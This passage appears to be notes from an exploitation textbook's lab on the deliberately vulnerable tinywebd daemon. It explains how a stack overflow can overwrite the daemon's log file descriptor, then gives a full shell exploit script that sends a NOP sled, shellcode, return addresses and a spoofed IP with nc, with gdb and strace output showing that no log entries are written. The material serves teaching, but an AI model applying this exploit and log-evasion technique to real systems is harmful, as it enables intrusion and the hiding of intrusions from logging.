Ideally, we want to leave no trace at all
In the setup on the LiveCD, technically we can just delete the log files after we get a root shell
However, let's assume this program is part of a secure infrastructure where the log files are mirrored to a secure logging server that has minimal access or maybe even a line printer
In these cases, deleting the log files after the fact is not an option
The timestamp() function in the tinyweb daemon tries to be secure by writing directly to an open file descriptor
We can't stop this function from being called, and we can't undo the write it does to the log file
This would be a fairly effective countermeasure; however, it was implemented poorly
In fact, in the previous exploit, we stumbled upon this problem

Even though logfd is a global variable, it is also passed to handle_connection() as a function argument
From the discussion of functional context, we should remember that this creates another stack variable with the same name, logfd
Since this argument is found right after the client_addr_ptr on the stack, it gets partially overwritten by the null terminator and the extra 0x0a byte found at the end of the exploit buffer

__________________________________________________________________________________
(gdb) x/xw &client_addr_ptr
0xbffff7e4:     0xbffff5cf

(gdb) x/xw &logfd
0xbffff7e8:     0x00000a00

(gdb) x/4xb &logfd
0xbffff7e8:     0x00     0x0a     0x00     0x00

(gdb) x/8xb &client_addr_ptr
0xbffff7e4:     0xcf     0xf5     0xff     0xbf     0x00     0x0a     0x00     0x00

(gdb) p logfd
$6 = 2560

(gdb) quit
The program is running. Quit anyway (and detach it)? (y or n) y
Detaching from program: , process 27264

reader@hacking:~/booksrc $ sudo kill 27264
__________________________________________________________________________________

As long as the file descriptor doesn't happen to be 2560 (0x0a00 in hexadecimal), every time handle_connection() tries to write to the log it will fail

      This means that the actual file descriptor should not be 2560

This effect can be quickly explored using strace
In the output below, strace is used with -p command-line argument to attach to a running process
The -e trace=write argument tells strace to only look at write calls
Once again, the spoofing exploit tool is used in another terminal to connect and advance execution

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./tinywebd
Starting tiny web daemon.

reader@hacking:~/booksrc $ ps aux | grep tinywebd
root       478  0.0  0.0   1636   420 ?        Ss   23:24   0:00 ./tinywebd
reader     525  0.0  0.0   2880   748 pts/1    R+   23:24   0:00 grep tinywebd

reader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write
Process 478 attached - interrupt to quit
write(2560, "09/19/2007 23:29:30> ", 21) = -1 EBADF (Bad file descriptor)
write(2560, "From 12.34.56.78:9090 \"GET / HTT".., 47) = -1 EBADF (Bad file descriptor)
Process 478 detached
__________________________________________________________________________________

This output clearly shows the attempts to write to the log file failing
Normally, we woudln't be able to overwrite the logfd variable, since the client_addr_ptr is in the way
Carelessly mangling this pointer will usually lead to a crash
But since we've made sure this variable points to a valid memory(our injected spoofed address structure), we're free to overwrite the variables that lie beyond it
Since the tinyweb daemon redirects standard out to /dev/null, the next exploit script will overwrite the passed logfd variable with 1, for standard output
      
      This is different from the spoofed exploit because we specify the file descriptor for the logfd
      In the spoofed exploit, the file descriptor could (perhaps) be any data and relate to an open file, which will log the data

This will still prevent entries from being written to the log file but in a much nicer way-- without errors

xtool_tinywebd_silent.sh
__________________________________________________________________________________
#!/bin/sh
# Silent stealth exploitation tool for tinywebd
#     also spoofs IP address stored in memory

SPOOFIP="12.34.56.78"
SPOOFPORT="9090"

if [ -z "$2" ]; then  # If argument 2 is blank
   echo "Usage: $0 <shellcode file> <target IP>"
   exit
fi
FAKEREQUEST="GET / HTTP/1.1\x00"
FR_SIZE=$(perl -e "print \"$FAKEREQUEST\"" | wc -c | cut -f1 -d ' ')
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # At +100 bytes from buffer @ 0xbffff5c0
FAKEADDR="\xcf\xf5\xff\xbf" # At +15 bytes from buffer @ 0xbffff5c0
echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
echo "fake request: \"$FAKEREQUEST\" ($FR_SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))

echo "[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret addr 128] [*fake_addr 8]"
(perl -e "print \"$FAKEREQUEST\"";
 ./addr_struct "$SPOOFIP" "$SPOOFPORT";
 perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
perl -e "print \"$RETADDR\"x32 . \"$FAKEADDR\"x2 . \"\x01\x00\x00\x00\r\n\"") | nc -w 1 -v $2 80
__________________________________________________________________________________

When this script is used, the exploit is totally silent and nothing is written to the log file

__________________________________________________________________________________
reader@hacking:~/booksrc $ sudo rm /Hacked

reader@hacking:~/booksrc $ ./tinywebd
Starting tiny web daemon..

reader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log
-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log

reader@hacking:~/booksrc $ ./xtool_tinywebd_silent.sh mark_restore 127.0.0.1
target IP: 127.0.0.1
shellcode: mark_restore (53 bytes)
fake request: "GET / HTTP/1.1\x00" (15 bytes)
[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128] [*fake_addr 8]
localhost [127.0.0.1] 80 (www) open

reader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log
-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log

reader@hacking:~/booksrc $ ls -l /Hacked
-rw------- 1 root reader 0 2007-09-19 23:35 /Hacked
__________________________________________________________________________________

Notice the log file's size and access time remain the same
Using this technique, we can exploit tinywebd without leaving any trace in the log files
In addition, the write calls execute cleanly, as everything is written to /dev/null
This is shown by strace in the output below, when the silent exploit tool is run in another terminal

__________________________________________________________________________________
reader@hacking:~/booksrc $ ps aux | grep tinywebd
root       478  0.0  0.0   1636   420 ?        Ss    23:24    0:00 ./tinywebd
reader    1005  0.0  0.0   2880   748 pts/1    R+    23:36    0:00 grep tinywebd

reader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write
Process 478 attached - interrupt to quit
write(1, "09/19/2007 23:36:31> ", 21)   = 21
write(1, "From 12.34.56.78:9090 \"GET / HTT".., 47) = 47
Process 478 detached
__________________________________________________________________________________